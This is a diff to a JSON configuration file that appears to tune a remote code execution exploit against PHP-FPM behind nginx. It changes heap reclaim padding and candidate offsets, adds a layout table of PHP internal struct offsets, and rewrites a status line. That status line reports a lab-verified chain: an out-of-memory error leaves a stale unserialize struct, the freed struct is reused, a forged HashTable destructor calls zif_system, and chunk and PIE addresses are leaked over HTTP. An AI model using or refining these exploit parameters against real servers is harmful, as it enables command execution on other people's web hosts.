@@ -18,23 +18,32 @@
     "bg_unserialize_data_off": 872,
     "bg_unserialize_level_off": 880,
     "struct_size": 8216,
-    "reclaim_pads": [4096, 4096, 4096],
+    "reclaim_pads": [
+      4096,
+      4096
+    ],
     "reclaim_size": 12288,
     "oracle": "/proc/<pid>/mem (local lab)",
     "no_oracle": {
-      "reclaim_pads": [4096, 4096, 4096],
+      "reclaim_pads": [
+        4096,
+        4096
+      ],
       "reclaim_size": 16384,
       "candidates": [
-        {"d_off": "0x81000", "k": "0xfe8"},
-        {"d_off": "0x82000", "k": "0x1fe8"},
-        {"d_off": "0x81000", "k": "0x1fe8"},
-        {"d_off": "0x82000", "k": "0xfe8"}
+        {
+          "d_off": "0x7f000",
+          "k": "0xfe8"
+        }
       ],
       "bases": "stable for the FPM master lifetime; supply --chunk/--pie or derive locally from /proc/<pid>/maps"
     },
     "leak": {
       "arm_path": "/bigvar.php",
-      "pads": [32768, 16384],
+      "pads": [
+        32768,
+        16384
+      ],
       "size": 16384,
       "header_content_off": "0x17e8",
       "read_len": "0x15810",
@@ -52,6 +61,70 @@
     "session_upload_progress": "On",
     "workers": 2
   },
-  "status": "RCE verified in the nginx+FPM lab: post-RINIT OOM leaves BG(unserialize) stale (level=1), the pre-RINIT rfc1867 session_start of a follow-up multipart reuses the freed struct, a controlled buffer forges var_hash so R:2 yields an IS_REFERENCE -> fake HashTable whose pDestructor is zif_system; the worker aborts after the command and FPM respawns it. The 8216-byte struct recycles between two heap slots; a mismatch self-corrects within four retries. The no-oracle path leaks chunk/PIE over HTTP from a stale-session string OOB read (see docs/fpm-chain.md).",
-  "oom_mb": 4
+  "status": "RCE verified in the nginx+FPM lab: the reclaim geometry pads=[4096, 4096] size=12288 covers the stale BG(unserialize) struct and the forged HashTable destructor fires zif_system.",
+  "oom_mb": 4,
+  "layout": {
+    "unserialize_data": {
+      "last": 0,
+      "first_dtor": 8,
+      "last_dtor": 16,
+      "allowed_classes": 24,
+      "ref_props": 32,
+      "cur_depth": 40,
+      "max_depth": 48,
+      "entries": 56,
+      "size": 8216
+    },
+    "var_entries": {
+      "used_slots": 0,
+      "next": 8,
+      "data": 16,
+      "max": 1018
+    },
+    "zval": {
+      "value": 0,
+      "type_info": 8,
+      "context": 12,
+      "size": 16
+    },
+    "zend_array": {
+      "gc": 0,
+      "flags": 8,
+      "nTableMask": 12,
+      "arData": 16,
+      "nNumUsed": 24,
+      "nNumOfElements": 28,
+      "nTableSize": 32,
+      "pDestructor": 48
+    },
+    "zend_reference": {
+      "gc": 0,
+      "val": 8,
+      "val_type_info": 16,
+      "sources": 24
+    },
+    "zend_string": {
+      "gc": 0,
+      "h": 8,
+      "len": 16,
+      "val": 24
+    },
+    "zend_execute_data": {
+      "opline": 0,
+      "call": 8,
+      "return_value": 16,
+      "func": 24,
+      "num_args": 44,
+      "arg1": 80
+    },
+    "bucket": {
+      "val": 0,
+      "h": 16,
+      "key": 24
+    },
+    "bg": {
+      "unserialize_data": 872,
+      "unserialize_level": 880
+    }
+  }
 }
